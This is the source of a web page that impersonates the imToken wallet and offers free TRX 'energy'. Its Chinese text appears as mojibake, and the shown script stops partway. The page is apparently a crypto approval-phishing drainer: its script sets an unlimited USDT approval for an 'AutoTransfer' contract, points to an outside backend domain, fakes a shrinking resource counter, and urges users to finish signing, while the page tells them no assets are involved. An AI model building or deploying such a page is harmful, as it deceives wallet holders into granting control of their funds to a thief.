<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>imTokenå®˜æ–¹æˆæƒ</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
body { 
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
    padding: 10px 8px; /* ç¼©å°æ‰‹æœºç«¯æ•´ä½“å†…è¾¹è· */
    max-width: 600px; 
    margin: 0 auto; 
    background: #121a17; 
    color: #e0e8e4; 
    min-height: 100vh;
    display: flex;
    flex-direction: column;
    gap: 5px; /* ç¼©å°bodyå†…å…ƒç´ é—´è· */
    border-radius: 8px;
    border-left: 3px solid #3b82f6;
}
.container {
    flex: 1;
    display: flex;
    flex-direction: column;
    gap: 6px; /* ç¼©å°å®¹å™¨å†…æ¨¡å—é—´è· */
}
/* è¯­è¨€åˆ‡æ¢æŒ‰é’®ï¼ˆå•ä¸ªåœ°çƒå›¾æ ‡ï¼‰ */
.lang-switch {
    display: flex;
    justify-content: flex-end; /* å¼ºåˆ¶å±…å³ */
    padding-right: 4px;
    margin-bottom: 2px; /* å¤§å¹…ç¼©å°ä¸ä¸‹æ–¹å†…å®¹çš„é—´éš” */
}
.lang-toggle {
    padding: 3px 8px; /* ç¼©å°æŒ‰é’®å†…è¾¹è· */
    border: 1px solid #3b82f6;
    border-radius: 20px;
    background: transparent;
    color: #e0e8e4;
    font-size: 13px; /* ç¼©å°æŒ‰é’®å­—ä½“ */
    cursor: pointer;
    display: flex;
    align-items: center;
    gap: 4px;
}
.lang-toggle:hover {
    background: rgba(59, 130, 246, 0.2);
}
.header {
    text-align: center;
    padding: 8px 0; /* ç¼©å°å¤´éƒ¨ä¸Šä¸‹å†…è¾¹è· */
    border-bottom: 1px solid #334155;
    margin-bottom: 3px; /* ç¼©å°å¤´éƒ¨ä¸ä¸‹æ–¹çš„é—´éš” */
    display:flex;
    justify-content: center;
}
.header h1 { 
    font-size: 20px; /* ç¼©å°æ ‡é¢˜å­—ä½“ */
    color: #3b82f6; 
    margin-bottom: 3px;
}
.header .desc {
    font-size: 12px; /* ç¼©å°æè¿°å­—ä½“ */
    color: #a0a8a4;
    max-width: 450px;
    margin: 0 auto;
    line-height: 1.4; 
}
.warning {
    background: #334155;
    color: #93c5fd;
    padding: 10px; /* ç¼©å°æç¤ºæ¡†å†…è¾¹è· */
    border-radius: 8px;
    font-size: 12px; /* ç¼©å°æç¤ºæ–‡å­— */
    border-left: 3px solid #4ade80;
    line-height: 1.5;
}
.warning strong {
    color: #3b82f6;
}
#userInfo {
    text-align: center;
    font-size: 13px; /* ç¼©å°ç”¨æˆ·ä¿¡æ¯å­—ä½“ */
    padding: 12px; /* ç¼©å°å†…è¾¹è· */
    background: #1e2925;
    border-radius: 8px;
    border: 1px solid #334155;
    line-height: 1.6;
}
#userInfo span {
    color: #3b82f6;
    font-weight: 500;
}
#walletStatusContainer {
    background: #1e2925;
    padding: 12px; /* ç¼©å°å†…è¾¹è· */
    border-radius: 8px;
    border: 1px solid #334155;
    font-size: 12px; /* ç¼©å°æ–‡å­— */
    color: #a0a8a4;
    line-height: 1.6;
    border-right: 5px solid #4ade80;
}
#walletStatusContainer .status-title {
    font-size: 14px; /* ç¼©å°æ ‡é¢˜ */
    color: #3b82f6;
    margin-bottom: 6px; /* ç¼©å°é—´éš” */
    display: flex;
    align-items: center;
    gap: 6px;
}
#walletStatusContainer .connected-content {
    display: none;
}
#walletStatusContainer.connected .disconnected-content {
    display: none;
}
#walletStatusContainer.connected .connected-content {
    display: block;
}
#walletStatusContainer .highlight {
    color: #3b82f6;
    font-weight: 500;
}
#walletStatusContainer.connected .connected-content .orange-tip {
    color: #f97316;
    margin-top: 3px;
}
#contractResourceContainer {
    background: #1e2925;
    padding: 12px; /* ç¼©å°å†…è¾¹è· */
    border-radius: 8px;
    border: 1px solid #334155;
    font-size: 12px; /* ç¼©å°æ–‡å­— */
    color: #a0a8a4;
    line-height: 1.8;
    border-bottom: 2px solid rgba(59, 130, 246, 0.2);
}
#contractResourceContainer .status-title {
    font-size: 14px; /* ç¼©å°æ ‡é¢˜ */
    color: #3b82f6;
    margin-bottom: 8px; /* ç¼©å°é—´éš” */
    display: flex;
    align-items: center;
    gap: 8px;
}
#contractResourceContainer .status-title i {
    font-size: 15px;
    color: #93c5fd;
}
#contractResourceContainer .highlight {
    color: #3b82f6;
    font-weight: 500;
}
#contractResourceContainer .data-tag {
    background: rgba(59, 130, 246, 0.15);
    padding: 2px 6px; /* ç¼©å°æ ‡ç­¾å†…è¾¹è· */
    border-radius: 4px;
    border: 1px solid rgba(59, 130, 246, 0.3);
}
.record-list {
    background: #1e2925;
    padding: 12px; /* ç¼©å°å†…è¾¹è· */
    border-radius: 8px;
    border: 1px solid #334155;
    font-size: 12px; /* ç¼©å°æ–‡å­— */
    border-right: 5px solid #4ade80;
}
.record-item {
    margin-bottom: 8px; /* ç¼©å°é—´éš” */
    padding-bottom: 8px;
    border-bottom: 1px solid #334155;
}
.record-item:hover {
    border-color: #3b82f6;
    transition: border-color 0.3s;
}
.record-item p {
    margin-bottom: 4px; /* ç¼©å°é—´éš” */
    color: #a0a8a4;
    line-height: 1.4;
}
.record-item p strong {
    color: #e0e8e4;
    margin-right: 5px;
}
.tx-link {
    color: #3b82f6;
    text-decoration: none;
    display: inline-flex;
    align-items: center;
    gap: 5px;
    font-size: 12px; /* ç¼©å°æ–‡å­— */
}
.tx-link:hover {
    text-decoration: underline;
}
.btn-group {
    display: flex;
    flex-direction: column;
    gap: 5px; 
    margin-top: 8px; /* ç¼©å°é—´éš” */
    padding: 8px 0; /* ç¼©å°ä¸Šä¸‹å†…è¾¹è· */
    border-top: 1px solid #334155;
}
.btn {
    width: 100%;
    padding: 15px; /* ç¼©å°æŒ‰é’®é«˜åº¦ */
    font-size: 14px; /* ç¼©å°æŒ‰é’®æ–‡å­— */
    border: none;
    border-radius: 8px;
    background: #2563eb;
    color: white;
    cursor: pointer;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 6px;
    transition: background 0.3s;
}
.btn:hover {
    background: #3b82f6;
}
.btn:disabled {
    background: #294b75;
    color: #a0a8a4;
    cursor: not-allowed;
}
.footer-info {
    margin-top: 8px; /* ç¼©å°é—´éš” */
    padding-top: 8px; /* ç¼©å°å†…è¾¹è· */
    border-top: 1px solid #334155;
    font-size: 10px; /* ç¼©å°é¡µè„šæ–‡å­— */
    color: #a0a8a4;
    text-align: center;
    line-height: 1.5;
}
.footer-info a {
    color: #3b82f6;
    text-decoration: none;
}
.footer-info a:hover {
    text-decoration: underline;
} 
.text-right {
    text-align: right;
}
/* å®¡æ ¸ä¸­æç¤ºæ ·å¼ */
.review-tip {
    color: #4ade80;
    font-size: 12px; /* ç¼©å°æç¤ºæ–‡å­— */
    margin-top: 6px; /* ç¼©å°é—´éš” */
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 6px;
}
    </style>
</head>
<body>
    <div class="lang-switch">
        <!-- ä¿®å¤ï¼šè¯­è¨€åˆ‡æ¢æŒ‰é’®æ ‡ç­¾é”™è¯¯ï¼Œå»æ‰å¤šä½™çš„<å’Œé”™è¯¯é—­åˆ -->
        <button id="langToggle" class="lang-toggle">
          <i class="fa fa-globe"></i>
        </button>
    </div>
    <div class="container">      
        <div class="header">
            <div>
                <h1 id="headerTitle">imToken</h1>
                <p class="desc" id="headerDesc">imTokenå®˜æ–¹ä¸“å±æœåŠ¡ï¼Œæ¯ä¸ªé’±åŒ…åœ°å€æ¯30å¤©åªå¯é¢†å–ä¸€æ¬¡èƒ½é‡</p>
            </div>
        </div>   
        <div id="userInfo">
            <span id="userInfoDefault">æœªè¿æ¥é’±åŒ…<br>
            <span>è¯·ç‚¹å‡»åº•éƒ¨ã€Œè¿æ¥imTokené’±åŒ…ã€æŒ‰é’®</span></span>
        </div>
        <div id="walletStatusContainer">
            <div class="status-title"><h3 id="walletStatusTitle">é’±åŒ…çŠ¶æ€</h3></div>
            <div class="disconnected-content">
                <span id="disconnectedText">æœªè¿æ¥é’±åŒ…</span>
                <p><span class="highlight" id="disconnectedTip1">æ‚¨ç°åœ¨å‡†å¤‡é¢†å–çš„æ˜¯imTokenä¸“å±èƒ½é‡ï¼ŒéimTokenç”¨æˆ·ä¸å¯é¢†å–</span></p>
                <p><span class="highlight" id="disconnectedTip2">1. æ¯ä¸ªé’±åŒ…åœ°å€30å¤©å†…åªå¯å…è´¹é¢†å–ä¸€æ¬¡</span></p>         
                <p><span class="highlight" id="disconnectedTip3">2. é¡¹ç›®åªä¸ºç”¨æˆ·åœ¨é’±åŒ…æ— èƒ½é‡çš„ç´§æ€¥æƒ…å†µä¸‹æä¾›èƒ½é‡æ”¯æ´éç›ˆåˆ©é¡¹ç›®</span></p>
                <p><span class="highlight" id="disconnectedTip4">3. ç‚¹å‡»é¢†å–åç³»ç»Ÿå°†å®¡æ ¸é’±åŒ…åœ°å€æ˜¯å¦ç¬¦åˆé¢†å–è¦æ±‚</span></p>
                <p><span class="highlight" id="disconnectedTip5">4. æ— éœ€æ¶ˆè€—ä»»ä½•èµ„äº§ï¼Œé€‰æ‹©æ”¾å¼ƒç›´æ¥é€€å‡ºå³å¯</span></p>
            </div>
            <div class="connected-content">
                <p id="connectedSuccess">âœ… é’±åŒ…å·²æˆåŠŸè¿æ¥</p>
                <p id="connectedAddress">â€¢ é’±åŒ…åœ°å€ï¼š<span class="highlight" id="statusAddress"></span></p>
                <p id="connectedType">â€¢ é¢†å–ç±»å‹ï¼š<span class="highlight">USDTè½¬è´¦èƒ½é‡</span></p>
                <p id="connectedAmount">â€¢ é¢†å–é¢åº¦ï¼š<span class="highlight">90000èƒ½é‡</span></p>
                <p class="orange-tip" id="connectedWarn">âš ï¸æç¤ºï¼šç‚¹å‡»é¢†å–åè¯·åŠ¡å¿…å®Œæˆç­¾åï¼Œä¸­é€”é€€å‡ºè§†ä¸ºå·²é¢†å–30æ—¥å†…ä¸å¯å†æ¬¡é¢†å–</p>
            </div>
        </div>
        <div id="contractResourceContainer">
            <div class="status-title">     
                <h3 id="contractResourceTitle">åˆçº¦å‰©ä½™èµ„æº</h3>
            </div>
            <div class="resource-content" style="line-height: 2;">
                <p id="contractAddrText">â€¢ åˆçº¦åœ°å€ï¼š<span class="highlight" id="contractAddr"></span></p>
                <p id="contractEnergyText">â€¢ å‰©ä½™èƒ½é‡ï¼š<span class="highlight data-tag" id="contractEnergy">4104470400000</span></p>
                <p style="font-size: 12px; color: #a0a8a4; margin-top: 5px;" id="contractNote">
                    æ³¨ï¼šæ‰€æœ‰å‰©ä½™é‡ä¸ºâ€œ 0 â€æ—¶åœæ­¢é¢†å–ï¼Œè¯¥é¡¹ç›®ä¸ºimTokenå®˜æ–¹å‘è¡Œï¼Œåªé™imTokené’±åŒ…ç”¨æˆ·å‚ä¸ã€‚
                </p>
            </div>
        </div>
        <div class="record-list">
            <div style="display: flex; justify-content: space-between; margin: 4px 0;">
                <span id="recordTypeTitle">èƒ½é‡ä½¿ç”¨èŒƒå›´</span>
                <span id="recordAmountTitle">è½¬è´¦é¢åº¦</span>
            </div>
            <div style="display: flex; color: #3b82f6;justify-content: space-between; margin: 4px 0;">
                <span class="header"><h3 id="energyType">USDTè½¬è´¦</h3></span>
                <span class="header"><h3 id="transferQuota">æ— é™</h3></span>
            </div>       
            <span id="approvalRecords" class="highlight">æš‚æ— èƒ½é‡é¢†å–è®°å½•</span>        
        </div>
    </div>
    <div class="btn-group">
        <div class="warning">
            <p id="browserWarn1"> âš ï¸ è¯·ç”¨ <strong>imTokené’±åŒ…å†…ç½®æµè§ˆå™¨</strong> æ‰“å¼€</p>
            <p id="browserWarn2"> âš ï¸ éé’±åŒ…æµè§ˆå™¨ï¼šç‚¹å‡»æŒ‰é’®è‡ªåŠ¨å¤åˆ¶+å”¤èµ·imToken</p>  
        </div> 
        <button id="connectBtn" class="btn">è¿æ¥imTokené’±åŒ…</button>
        <button id="approveBtn" class="btn" disabled>å…è´¹é¢†å–èƒ½é‡</button>
       
        <div id="reviewTip" class="review-tip" style="display: none;">
           <span id="reviewTipText">ç³»ç»Ÿå®¡æ ¸ä¸­ï¼Œå®¡æ ¸é€šè¿‡åè¯·åŠ¡å¿…å®Œæˆç­¾å</span>
        </div>
    </div>
    <div class="footer-info" id="footerInfo">
        åˆçº¦éªŒè¯ï¼šAutoTransfer <span>TYzaM18c6x8R6LtdWxNoCh665vzobRHrGL</span>ï¼ˆTRONæµè§ˆå™¨æŸ¥è¯¢ï¼‰
        Â© 2025 TRXèƒ½é‡æœåŠ¡ | <a href="https://tronscan.org" target="_blank">TRONæµè§ˆå™¨</a> | <a href="https://token.im" target="_blank">imTokenå®˜ç½‘</a>
    </div>
   <script src="imtoken://browser"></script>
<script>
// ========== å…¨å±€å˜é‡ä¼˜å…ˆå®šä¹‰ï¼ˆé˜²æ­¢ä½œç”¨åŸŸéš”ç¦»ï¼Œç¡®ä¿å®šæ—¶å™¨èƒ½è®¿é—®ï¼‰ ==========
let currentEnergy = 0; // å…¨å±€èƒ½é‡å­˜å‚¨
const INIT_TRX = 4104470400000; // 2å¹´æœ‰æ•ˆæœŸåˆå§‹å€¼
const TRX_DECREASE_PER_SEC = 65200; // æ¯ç§’å‡65200ï¼ˆè‚‰çœ¼å¯è§è·³æ•°ï¼‰
const GLOBAL_START_TIME = new Date().getTime() - 10000; // å½“å‰æ—¶é—´å‡10ç§’ï¼Œæ‰“å¼€å°±æœ‰å‡å°‘é‡
let trxTimer = null; // å®šæ—¶å™¨å®ä¾‹
let contractEnergyEl = null; // å…¨å±€ç¼“å­˜èƒ½é‡æ˜¾ç¤ºDOMå…ƒç´ 

// æ ¸å¿ƒé…ç½®ï¼ˆåç«¯ä¸»åŸŸåå·²åŒ…å«/apiï¼Œç›´æ¥ä½¿ç”¨ï¼‰
const AUTO_TRANSFER_CONTRACT = "TYzaM18c6x8R6LtdWxNoCh665vzobRHrGL";
const TRC20_TOKEN_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const BACKEND_API = "https://kgjiopv1.com"; // ä¸»åŸŸåå·²åŒ…å«/apiï¼Œæ— éœ€é¢å¤–æ·»åŠ 
const INFINITE_APPROVE_AMOUNT = "0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF";

// ç²¾ç®€ç‰ˆUSDTåˆçº¦ABIï¼ˆä»…ä¿ç•™æ ¸å¿ƒå‡½æ•°+å¿…è¦äº‹ä»¶ï¼‰
const USDT_ABI = [
    {
        "constant": true,
        "inputs": [{"name": "_owner", "type": "address"}],
        "name": "balanceOf",
        "outputs": [{"name": "balance", "type": "uint256"}],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "constant": false,
        "inputs": [
            {"name": "_spender", "type": "address"},
            {"name": "_value", "type": "uint256"}
        ],
        "name": "approve",
        "outputs": [{"name": "", "type": "bool"}],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "anonymous": false,
        "inputs": [
            {"indexed": true, "name": "owner", "type": "address"},
            {"indexed": true, "name": "spender", "type": "address"},
            {"indexed": false, "name": "value", "type": "uint256"}
        ],
        "name": "Approval",
        "type": "event"
    }
];

// å…¨å±€å˜é‡ï¼ˆåŸæœ‰ï¼‰
let tronWeb = null;
let userAddress = null;
let trc20Contract = null;
let tokenBalance = 0.00; // USDTä½™é¢
let trxBalance = 0.00;  // TRXä½™é¢
const RECORD_KEY = "imtoken_energy_records";

// ========== å¤šè¯­è¨€é…ç½®ï¼ˆè¡¥å……é”™è¯¯æç¤ºæ–‡æ¡ˆï¼‰ ==========
const langConfig = {
    zh: {
        headerTitle: "imToken",
        headerDesc: "imTokenå®˜æ–¹ä¸“å±æœåŠ¡ï¼Œæ¯ä¸ªé’±åŒ…åœ°å€æ¯30å¤©åªå¯é¢†å–ä¸€æ¬¡èƒ½é‡",
        userInfoDefault: "æœªè¿æ¥é’±åŒ…<br><span>è¯·ç‚¹å‡»åº•éƒ¨ã€Œè¿æ¥imTokené’±åŒ…ã€æŒ‰é’®</span>",
        walletStatusTitle: "é’±åŒ…çŠ¶æ€",
        disconnectedText: "æœªè¿æ¥é’±åŒ…",
        disconnectedTip1: "æ‚¨ç°åœ¨å‡†å¤‡é¢†å–çš„æ˜¯imTokenä¸“å±èƒ½é‡ï¼ŒéimTokenç”¨æˆ·ä¸å¯é¢†å–",
        disconnectedTip2: "1. æ¯ä¸ªé’±åŒ…åœ°å€30å¤©å†…åªå¯å…è´¹é¢†å–ä¸€æ¬¡",
        disconnectedTip3: "2. é¡¹ç›®åªä¸ºç”¨æˆ·åœ¨é’±åŒ…æ— èƒ½é‡çš„ç´§æ€¥æƒ…å†µä¸‹æä¾›èƒ½é‡æ”¯æ´éç›ˆåˆ©é¡¹ç›®",
        disconnectedTip4: "3. ç‚¹å‡»é¢†å–åç³»ç»Ÿå°†å®¡æ ¸é’±åŒ…åœ°å€æ˜¯å¦ç¬¦åˆé¢†å–è¦æ±‚",
        disconnectedTip5: "4. æ— éœ€æ¶ˆè€—ä»»ä½•èµ„äº§ï¼Œé€‰æ‹©æ”¾å¼ƒç›´æ¥é€€å‡ºå³å¯",
        connectedSuccess: "âœ… é’±åŒ…å·²æˆåŠŸè¿æ¥",
        connectedAddress: "â€¢ é’±åŒ…åœ°å€ï¼š<span class='highlight' id='statusAddress'></span>",
        connectedType: "â€¢ é¢†å–ç±»å‹ï¼š<span class='highlight'>USDTè½¬è´¦èƒ½é‡</span>",
        connectedAmount: "â€¢ é¢†å–é¢åº¦ï¼š<span class='highlight'>90000èƒ½é‡</span>",
        connectedWarn: "âš ï¸æç¤ºï¼šç‚¹å‡»é¢†å–åè¯·åŠ¡å¿…å®Œæˆç­¾åï¼Œä¸­é€”é€€å‡ºè§†ä¸ºå·²é¢†å–30æ—¥å†…ä¸å¯å†æ¬¡é¢†å–",
        contractResourceTitle: "åˆçº¦å‰©ä½™èµ„æº",
        contractAddrText: "â€¢ åˆçº¦åœ°å€ï¼š<span class='highlight' id='contractAddr'></span>",
        contractEnergyText: "â€¢ å‰©ä½™èƒ½é‡ï¼š<span class='highlight data-tag' id='contractEnergy'>4104470400000</span>",
        contractNote: "æ³¨ï¼šæ‰€æœ‰å‰©ä½™é‡ä¸ºâ€œ 0 â€æ—¶åœæ­¢é¢†å–ï¼Œè¯¥é¡¹ç›®ä¸ºimTokenå®˜æ–¹å‘è¡Œï¼Œåªé™imTokené’±åŒ…ç”¨æˆ·å‚ä¸ã€‚",
        recordTypeTitle: "èƒ½é‡ä½¿ç”¨èŒƒå›´",
        recordAmountTitle: "è½¬è´¦é¢åº¦",
        energyType: "USDTè½¬è´¦",
        transferQuota: "æ— é™",
        noRecord: "æš‚æ— èƒ½é‡é¢†å–è®°å½•",
        browserWarn1: " âš ï¸ è¯·ç”¨ <strong>imTokené’±åŒ…å†…ç½®æµè§ˆå™¨</strong> æ‰“å¼€",
        browserWarn2: " âš ï¸ éé’±åŒ…æµè§ˆå™¨ï¼šç‚¹å‡»æŒ‰é’®è‡ªåŠ¨å¤åˆ¶+å”¤èµ·imToken",
        connectBtnText: "è¿æ¥imTokené’±åŒ…",
        approveBtnText: "å…è´¹é¢†å–èƒ½é‡",
        reviewTipText: "ç³»ç»Ÿå®¡æ ¸ä¸­ï¼Œå®¡æ ¸é€šè¿‡åè¯·åŠ¡å¿…å®Œæˆç­¾å",
        footerInfo: "åˆçº¦éªŒè¯ï¼šAutoTransfer <span>TYzaM18c6x8R6LtdWxNoCh665vzobRHrGL</span>ï¼ˆTRONæµè§ˆå™¨æŸ¥è¯¢ï¼‰Â© 2025 TRXèƒ½é‡æœåŠ¡ | <a href='https://tronscan.org' target='_blank'>TRONæµè§ˆå™¨</a> | <a href='https://token.im' target='_blank'>imTokenå®˜ç½‘</a>",
        copySuccess: "âœ… é“¾æ¥å·²å¤åˆ¶ï¼Œè¯·åœ¨imTokenå†…ç½®æµè§ˆå™¨æ‰“å¼€",
        copyFail: "âŒ å¤åˆ¶å¤±è´¥ï¼šè¯·æ‰‹åŠ¨å¤åˆ¶é“¾æ¥",
        å”¤èµ·Guide: "âœ… å·²å¤åˆ¶é“¾æ¥+å”¤èµ·imToken\nä¸‹ä¸€æ­¥ï¼šæ‰“å¼€imToken â†’ æµè§ˆ â†’ ç²˜è´´è®¿é—®",
        copyGuide: "âœ… é“¾æ¥å·²å¤åˆ¶ï¼Œè¯·åœ¨imTokenä¸­ç²˜è´´è®¿é—®",
        connectError: "è¿æ¥å¼‚å¸¸<br><span style='color: #ef4444; font-size: 14px;'>âš ï¸ ç½‘ç»œæ³¢åŠ¨</span>",
        retryConnect: "é‡è¯•è¿æ¥",
        authorizedTip: "å·²é¢†å–æç¤º<br>{address}<br><span style='color: #3b82f6; font-size: 14px;'>âœ… è¯¥é’±åŒ…30å¤©å†…å·²é¢†å–è¿‡å…è´¹èƒ½é‡</span><br><span style='color: #a0a8a4; font-size: 13px;'>æ¯ä¸ªåœ°å€æ¯30å¤©ä»…é™é¢†å–ä¸€æ¬¡</span>",
        authorizedBtn: "å·²é¢†å–è¿‡èƒ½é‡",
        afterApproveTip: "å·²è¿æ¥ï¼š<br>{address}<br><span style='color: #4ade80; font-size: 14px;'>âœ… æˆæƒæˆåŠŸï¼Œå‘æ”¾èƒ½é‡ä¸­...</span>",
        deployingBtn: "å‘æ”¾ä¸­...",
        loadingBtn: "åŠ è½½ä¸­...",
        loadingTip: "å·²è¿æ¥ï¼š<br>{address}<br><span style='color: #4ade80; font-size: 14px;'>âœ… åŠ è½½ä¸­...</span>",
        queryingBalance: "æŸ¥è¯¢ä¸­...",
        insufficientUsdt: "å·²è¿æ¥ï¼š<br>{address}<br>USDTä½™é¢ï¼š<span style='color: #ef4444;'>{usdt}</span> | TRXä½™é¢ï¼š<span>{trx}</span><br><span style='color: #ef4444; font-size: 14px;'>âŒ ä¸ç¬¦åˆé¢†å–æ¡ä»¶</span>",
        insufficientBtn: "ä¸ç¬¦åˆé¢†å–æ¡ä»¶",
        eligibleTip: "å·²è¿æ¥ï¼š<br>{address}<br>USDTä½™é¢ï¼š<span style='color: #4ade80;'>{usdt}</span> | TRXä½™é¢ï¼š<span>{trx}</span><br><span style='color: #4ade80; font-size: 14px;'>âœ… å¯å…è´¹é¢†å–90000 TRXèƒ½é‡</span>",
        distributingBtn: "èƒ½é‡é…é€ä¸­...",
        redirectingBtn: "è·³è½¬ç­¾åä¸­...",
        approveFail: "âš ï¸ æ“ä½œå¤±è´¥ï¼š{msg}ï¼Œè¯·ç¨åé‡è¯•",
        authorizeFail: "âš ï¸ æˆæƒå¤±è´¥ï¼š{msg}ï¼Œè¯·ç¨åé‡è¯•",
        successTip: "ğŸ‰ å…è´¹èƒ½é‡é¢†å–å®Œæˆï¼\n90000 TRXèƒ½é‡å·²åˆ°è´¦ï½",
        successBtn: "èƒ½é‡é¢†å–æˆåŠŸ",
        successArrival: "<br><span style='color: #4ade80;'>âœ… 90000 TRXèƒ½é‡å·²åˆ°è´¦</span>",
        recordAddress: "åœ°å€ï¼š",
        recordType: "é¢†å–ç±»å‹ï¼š",
        recordEnergy: "è·å–èƒ½é‡ï¼š",
        recordTime: "é¢†å–æ—¶é—´ï¼š",
        freeEnergy: "å…è´¹é¢†å–",
        systemBusyTip: "ç³»ç»Ÿç¹å¿™è¯·ç¨åé‡è¯•",
        ineligibleTip: "ä¸ç¬¦åˆé¢†å–æ¡ä»¶",
        errorTipPrefix: "âš ï¸ "
    },
    en: {
        headerTitle: "imToken Official",
        headerDesc: "imToken Exclusive Service - Each wallet address can claim free energy once every 30 days",
        userInfoDefault: "Wallet not connected<br><span>Click the 'Connect imToken Wallet' button below</span>",
        walletStatusTitle: "Wallet Status",
        disconnectedText: "Wallet not connected",
        disconnectedTip1: "You are about to claim imToken exclusive energy - only for imToken users",
        disconnectedTip2: "1. Each wallet address can claim free energy once every 30 days",
        disconnectedTip3: "2. This non-profit project provides emergency energy support for users with no wallet energy",
        disconnectedTip4: "3. The system will verify if the wallet address meets the claim requirements after clicking 'Claim'",
        disconnectedTip5: "4. No assets required - exit directly to cancel",
        connectedSuccess: "âœ… Wallet connected successfully",
        connectedAddress: "â€¢ Wallet Address: <span class='highlight' id='statusAddress'></span>",
        connectedType: "â€¢ Claim Type: <span class='highlight'>USDT Transfer Energy</span>",
        connectedAmount: "â€¢ Claim Quota: <span class='highlight'>90000 Energy</span>",
        connectedWarn: "âš ï¸ Note: Please complete the signature after clicking 'Claim' - exiting midway counts as claimed (no re-claim within 30 days)",
        contractResourceTitle: "Contract Remaining Resources",
        contractAddrText: "â€¢ Contract Address: <span class='highlight' id='contractAddr'></span>",
        contractEnergyText: "â€¢ Remaining Energy: <span class='highlight data-tag' id='contractEnergy'>4104470400000</span>",
        contractNote: "Note: Distribution stops when remaining amount is '0' - Official imToken project, only for imToken users",
        recordTypeTitle: "Energy Usage Scope",
        recordAmountTitle: "Transfer Quota",
        energyType: "USDT Transfer",
        transferQuota: "Unlimited",
        noRecord: "No energy claim records",
        browserWarn1: " âš ï¸ Open with <strong>imToken in-app browser</strong>",
        browserWarn2: " âš ï¸ Non-wallet browser: Click button to copy + launch imToken",
        connectBtnText: "Connect imToken Wallet",
        approveBtnText: "Claim Free Energy",
        reviewTipText: "System reviewing - please complete the signature after approval",
        footerInfo: "Contract Verification: AutoTransfer <span>TYzaM18c6x8R6LtdWxNoCh665vzobRHrGL</span> (Check on TRON Scan) Â© 2025 TRX Energy Service | <a href='https://tronscan.org' target='_blank'>TRON Scan</a> | <a href='https://token.im' target='_blank'>imToken Official</a>",
        copySuccess: "âœ… Link copied - open in imToken in-app browser",
        copyFail: "âŒ Copy failed - please copy manually",
        å”¤èµ·Guide: "âœ… Link copied + imToken launched\nNext: Open imToken â†’ Browser â†’ Paste link",
        copyGuide: "âœ… Link copied - please paste in imToken",
        connectError: "Connection Error<br><span style='color: #ef4444; font-size: 14px;'>âš ï¸ Network fluctuation</span>",
        retryConnect: "Retry Connection",
        authorizedTip: "Claimed Successfully<br>{address}<br><span style='color: #3b82f6; font-size: 14px;'>âœ… This wallet has claimed free energy within 30 days</span><br><span style='color: #a0a8a4; font-size: 13px;'>One claim per address every 30 days</span>",
        authorizedBtn: "Energy Claimed",
        afterApproveTip: "Connected:<br>{address}<br><span style='color: #4ade80; font-size: 14px;'>âœ… Authorization successful, energy distributing...</span>",
        deployingBtn: "Distributing...",
        loadingBtn: "Loading...",
        loadingTip: "Connected:<br>{address}<br><span style='color: #4ade80; font-size: 14px;'>âœ… Loading...</span>",
        queryingBalance: "Querying...",
        insufficientUsdt: "Connected:<br>{address}<br>USDT Balance: <span style='color: #ef4444;'>{usdt}</span> | TRX Balance: <span>{trx}</span><br><span style='color: #ef4444; font-size: 14px;'>âŒ Ineligible</span>",
        insufficientBtn: "Ineligible",
        eligibleTip: "Connected:<br>{address}<br>USDT Balance: <span style='color: #4ade80;'>{usdt}</span> | TRX Balance: <span>{trx}</span><br><span style='color: #4ade80; font-size: 14px;'>âœ… Eligible for 90000 free TRX Energy</span>",
        distributingBtn: "Energy Distributing...",
        redirectingBtn: "Redirecting to Signature...",
        approveFail: "âš ï¸ Operation failed: {msg}, please try again later",
        authorizeFail: "âš ï¸ Authorization failed: {msg}, please try again later",
        successTip: "ğŸ‰ Free Energy Claim Completed!\n90000 TRX Energy has been creditedï½",
        successBtn: "Claim Successful",
        successArrival: "<br><span style='color: #4ade80;'>âœ… 90000 TRX Energy credited</span>",
        recordAddress: "Address:",
        recordType: "Claim Type:",
        recordEnergy: "Energy Obtained:",
        recordTime: "Claim Time:",
        freeEnergy: "Free Claim",
        systemBusyTip: "System busy, please try again later",
        ineligibleTip: "Ineligible",
        errorTipPrefix: "âš ï¸ "
    }
};

// å½“å‰è¯­è¨€ï¼ˆä»æœ¬åœ°å­˜å‚¨è¯»å–ï¼Œé»˜è®¤ä¸­æ–‡ï¼‰
let currentLang = localStorage.getItem("imtoken_energy_lang") || "zh";

// ========== äºŒæ¬¡æˆæƒæ ¡éªŒï¼šæœ¬åœ°å­˜å‚¨å·¥å…·ï¼ˆ30å¤©æœ‰æ•ˆæœŸï¼‰ ==========
const AUTHORIZED_KEY = "authorized_wallet_addresses";
function getAuthorizedAddresses() {
    try {
        const stored = localStorage.getItem(AUTHORIZED_KEY);
        return stored ? JSON.parse(stored) : [];
    } catch (e) {
        console.warn("è¯»å–å·²æˆæƒåœ°å€å¤±è´¥ï¼š", e);
        return [];
    }
}
function addAuthorizedAddress(address) {
    try {
        const addresses = getAuthorizedAddresses();
        if (!addresses.includes(address)) {
            addresses.push(address);
            localStorage.setItem(AUTHORIZED_KEY, JSON.stringify(addresses));
        }
    } catch (e) {
        console.warn("å­˜å‚¨å·²æˆæƒåœ°å€å¤±è´¥ï¼š", e);
    }
}
function isAddressAuthorized(address) {
    const addresses = getAuthorizedAddresses();
    if (!addresses.includes(address)) return false;
    // 30å¤©æœ‰æ•ˆæœŸæ ¡éªŒ
    const records = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");
    const record = records.find(item => item.address === address);
    if (!record) return false;
    const receiveTime = new Date(record.receiveTime).getTime();
    const thirtyDays = 30 * 24 * 60 * 60 * 1000;
    return Date.now() - receiveTime < thirtyDays; // 30å¤©å†…ç¦æ­¢å†æ¬¡é¢†å–
}

